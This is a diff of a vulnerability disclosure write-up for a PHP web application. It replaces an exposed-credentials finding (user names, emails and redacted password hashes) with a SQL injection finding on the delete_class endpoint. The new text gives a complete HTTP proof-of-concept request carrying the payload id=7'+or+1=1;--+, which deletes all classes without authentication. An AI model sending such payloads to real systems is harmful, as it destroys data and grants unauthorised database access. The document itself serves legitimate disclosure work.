@@ -30,20 +30,27 @@ public function delete_class(){
 ```
 
 **Related CWE:**
-> [CWE-540: Inclusion of Sensitive Information in Source Code](https://cwe.mitre.org/data/definitions/540.html)
+> [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)
 
 ## **Details:**
-> Exposed Login Credentials containing username, email, and passwords on the GitHub Page (hashes redacted by me for responsible disclosure).
+> Allows SQL Injection by placing untrusted code
 
-```SQL 
-INSERT INTO `users` (`id`, `username`, `email`, `password`) VALUES
-(1, 'Ajay Kumar', 'ajay@gmail.com', '12***'),
-(2, 'Amit', 'amit@gmail.com', '12**'),
-(3, 'Keerti Panwar', 'keerti@gmail.com', '$2y$10$g******************lDntZ7ZXDD*********'),
-(4, 'Ankita', 'ankita@gmail.com', '$2y$10$ZuW****************************pyEyRhtK'),
-(5, 'Keerti Panwar', 'keerti1234@gmail.com', '$2y$10$PL6o************************osRIWEh1H.0Zi');
+![image](https://github.com/smurf-reigz/security/assets/48426940/b74a2c69-b612-4b7d-a61d-04e2320e2173)
+
+```http 
+POST /ajax-api.php?action=delete_class HTTP/1.1
+Host: localhost
+Content-Length: 16
+Connection: close
+
+id=7'+or+1=1;--+
 ```
+
+DELETES all classes without authentication.
+
+![image](https://github.com/smurf-reigz/security/assets/48426940/49ac0660-57e5-4cb0-9c4c-288b215d4ccd)
+
 
 ## **Vulnerability Impact:**
 > As an attacker, can do the following:
-> 1. Crack the passwords provided the hashes are visible.
+> 1. Run any database query and have same permission as the web application (default for this Web Application is root).
